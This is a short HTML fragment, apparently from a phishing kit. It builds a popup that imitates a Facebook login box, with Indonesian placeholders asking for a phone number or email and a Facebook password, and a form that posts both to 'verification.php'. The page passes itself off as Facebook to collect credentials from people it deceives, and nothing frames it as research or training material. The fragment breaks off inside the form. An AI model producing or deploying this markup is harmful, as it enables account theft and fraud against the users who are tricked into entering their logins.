...
<div class="popup-login facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		...
		<div class="content-box-fb">
			...
			<img src="https://f.top4top.io/p_2257x1cqy0.jpeg" style="width: 60px;">
			...
			<form class="login-form" action="verification.php" onsubmit="return AlexHost()" method="post">
				<label>
				<input type="text" id="user" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" id="pass" name="password" placeholder="Kata sandi Facebook" autocomplete="off" autocapitalize="off" required>
				</label>
